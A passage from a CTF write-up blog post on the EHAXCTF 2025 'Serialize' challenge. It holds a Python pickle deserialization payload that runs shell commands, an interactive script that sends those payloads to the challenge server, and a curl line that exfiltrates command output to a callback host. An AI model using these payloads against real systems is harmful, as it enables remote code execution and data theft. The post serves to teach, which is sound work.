</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;posix&#39;</span><span class=p>:</span> <span class=s1>&#39;system&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;command&#39;</span><span class=p>:</span> <span class=s1>&#39;dreky&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>This structure indicates the server deserializes the token and executes system commands. The vulnerability lies in pickle&rsquo;s <code>__reduce__</code> method, which allows arbitrary code execution during deserialization. A malicious payload can be crafted:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>posix</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Evil</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>__reduce__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># Returns a tuple of (callable, args) that pickle uses for reconstruction</span>
</span></span><span class=line><span class=cl>        <span class=c1># When deserialized, it executes: posix.system(command)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>posix</span><span class=o>.</span><span class=n>system</span><span class=p>,</span> <span class=p>(</span><span class=s1>&#39;cat flag.txt&#39;</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>pickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>Evil</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>Sending the modified token with <code>cat flag.txt</code> reveals different response codes in the <code>h1</code> tag, indicating command execution success or failure:</p><p><img src=Pasted%20image%2020250218150019.png alt="Modified token request/response"></p><p>To streamline the exploitation process, a custom Python console script automates payload generation and request handling:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>posix</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>readline</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Evil</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>__reduce__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>posix</span><span class=o>.</span><span class=n>system</span><span class=p>,</span> <span class=p>(</span><span class=n>cmd</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_payload</span><span class=p>(</span><span class=n>command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>cmd</span>  <span class=c1># Use global to make cmd accessible in Evil class</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span> <span class=o>=</span> <span class=n>command</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>pickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>Evil</span><span class=p>()))</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_response</span><span class=p>(</span><span class=n>html</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>soup</span> <span class=o>=</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>html</span><span class=p>,</span> <span class=s1>&#39;html.parser&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Find result in h1 tag</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>soup</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;h1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>result</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>result</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;No result found&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_request</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Accept&#39;</span><span class=p>:</span> <span class=s1>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;X-Serial-Token&#39;</span><span class=p>:</span> <span class=n>token</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error making request: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;-&#34;</span> <span class=o>*</span> <span class=mi>50</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>command</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Command &gt; &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>command</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;exit&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>command</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Create payload</span>
</span></span><span class=line><span class=cl>            <span class=n>token</span> <span class=o>=</span> <span class=n>create_payload</span><span class=p>(</span><span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Generated Token: </span><span class=si>{</span><span class=n>token</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Send request and get response</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>send_request</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Parse and display result</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>parse_response</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Result: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Exiting...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=Pasted%20image%2020250218150337.png alt="Console script output"></p><p>Command execution verification requires output exfiltration since responses only show exit codes. Using an HTTP callback service captures command output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Exfiltration payload</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;cmd=`</span><span class=si>{</span><span class=n>command</span><span class=si>}</span><span class=s1>` &amp;&amp; curl &#34;https://callback.domain/?=$(cmd)&#34;&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>The callback listener demonstrates successful command execution:</p><p><img src=Pasted%20image%2020250218150408.png alt></p><p><img src=Pasted%20image%2020250218150514.png alt="Callback listener showing command output"></p><p>This exploitation method combines deserialization vulnerability with command injection and data exfiltration techniques. The pickle vulnerability provides initial code execution, while DNS/HTTP callbacks bypass output restrictions.</p><h2 id=successful-exploitation>Successful Exploitation</h2><p>The first flag part (<code>oh_h3l1_</code>) enables targeted file searching. A grep command reveals the complete flag:</p><p><img src=Pasted%20image%2020250218150553.png alt="Flag exfiltration output"></p><p>Final flag: <code>E4HX{oh_h3l1_n44www_y0u_8r0k3_5th_w4l1}</code></p><h2 id=security-implications>Security Implications</h2><p>This challenge demonstrates critical vulnerability patterns:</p><ol><li>Client-side only authentication</li><li>Unsafe deserialization of user-controlled data</li><li>Command injection leading to RCE</li><li>Data exfiltration via DNS/HTTP requests</li></ol><h2 id=security-recommendations>Security Recommendations</h2><ul><li>Server-side authentication implementation</li><li>Avoiding pickle deserialization of untrusted data</li><li>Input validation and sanitization</li></ul></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>~/</a></li><li><a href=/posts>~/posts</a></li><li><a href=/about>~/about</a></li><li><a href=/work>~/work</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#challenge>Challenge</a></li><li><a href=#initial-analysis>Initial Analysis</a></li><li><a href=#technical-deep-dive>Technical Deep Dive</a></li><li><a href=#solution>Solution</a></li><li><a href=#successful-exploitation>Successful Exploitation</a></li><li><a href=#security-implications>Security Implications</a></li><li><a href=#security-recommendations>Security Recommendations</a></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&text=EHAXCTF%202025" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&title=EHAXCTF%202025" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&is_video=false&description=EHAXCTF%202025" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=EHAXCTF%202025&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&title=EHAXCTF%202025" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&title=EHAXCTF%202025" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&name=EHAXCTF%202025&description=%3ch1%20id%3d%22serialize-challenge-walkthrough%22%3eSerialize%20Challenge%20Walkthrough%3c%2fh1%3e%0a%3ch2%20id%3d%22challenge%22%3eChallenge%3c%2fh2%3e%0a%3cp%3e%3cimg%20src%3d%22Pasted%2520image%252020250218144551.png%22%20alt%3d%22Screenshot%20showing%20challenge%20description%22%3e%3c%2fp%3e%0a%3cp%3eThe%20challenge%20tests%20the%20following%20skills%3a%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eJavaScript%20deobfuscation%20and%20analysis%3c%2fli%3e%0a%3cli%3ePython%20pickle%20deserialization%20exploitation%3c%2fli%3e%0a%3cli%3eCommand%20injection%20techniques%3c%2fli%3e%0a%3cli%3eData%20exfiltration%20methods%3c%2fli%3e%0a%3c%2ful%3e%0a%3cp%3eRequired%20background%20knowledge%20includes%3a%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eJavaScript%20debugging%3c%2fli%3e%0a%3cli%3ePython%20pickle%20serialization%3c%2fli%3e%0a%3cli%3eCommand%20injection%20techniques%3c%2fli%3e%0a%3cli%3eWeb%20request%20manipulation%3c%2fli%3e%0a%3c%2ful%3e%0a%3ch2%20id%3d%22initial-analysis%22%3eInitial%20Analysis%3c%2fh2%3e%0a%3cp%3eThe%20challenge%20presents%20a%20login%20page%20with%20client-side%20JavaScript%20validation.%20Inspection%20of%20the%20source%20code%20reveals%20heavily%20obfuscated%20JavaScript%3a%3c%2fp%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20class%3d%22chroma%22%3e%0a%3ctable%20class%3d%22lntable%22%3e%3ctr%3e%3ctd%20class%3d%22lntd%22%3e%0a%3cpre%20tabindex%3d%220%22%20class%3d%22chroma%22%3e%3ccode%3e%3cspan%20class%3d%22lnt%22%3e1%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e2%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e3%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e4%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e5%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e6%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e7%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e8%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e9%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%0a%3ctd%20class%3d%22lntd%22%3e%0a%3cpre%20tabindex%3d%220%22%20class%3d%22chroma%22%3e%3ccode%20class%3d%22language-html%22%20data-lang%3d%22html%22%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3ebody%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eform%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eclass%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3blogin-form%26%2334%3b%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eh2%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3eLogin%20to%20get%20flag%3cspan%20class%3d%22p%22%3e%26lt%3b%2f%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eh2%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3einput%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3etype%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3btext%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eid%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3busername%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eplaceholder%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bEnter%20your%20username%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3erequired%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3einput%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3etype%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bpassword%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eid%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bpassword%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eplaceholder%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bEnter%20your%20password%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3erequired%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3ebutton%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3etype%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bsubmit%26%2334%3b%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3eLogin%3cspan%20class%3d%22p%22%3e%26lt%3b%2f%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3ebutton%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%2f%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eform%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3escript%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%3cspan%20class%3d%22err%22%3e%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d...%20redacted%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%3c%2ftr%3e%3c%2ftable%3e%0a%3c%2fdiv%3e%0a%3c%2fdiv%3e%3cp%3eThe%20full%20HTML%20source%20code%20is%20available%20in%20%3ca%20href%3d%22https%3a%2f%2fgist.github.com%2fjsnv-dev%2ffdf50b45b97ffa8f0083adfda7d11429%22%3ethis%20gist%3c%2fa%3e%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&t=EHAXCTF%202025" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2025 jsn>
<a class=icon target=_blank rel=noopener href=https://github.com/jsnv-dev aria-label=github><i class="fab fa-github" aria-hidden=true></i>
</a><a class=icon target=_blank rel=noopener href=https://www.linkedin.com/in/jasonvillaluna aria-label=linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></div><div class=footer-right><nav><ul><li><a href=/>~/</a></li><li><a href=/posts>~/posts</a></li><li><a href=/about>~/about</a></li><li><a href=/work>~/work</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script><script src=/js/code-copy.js></script></html>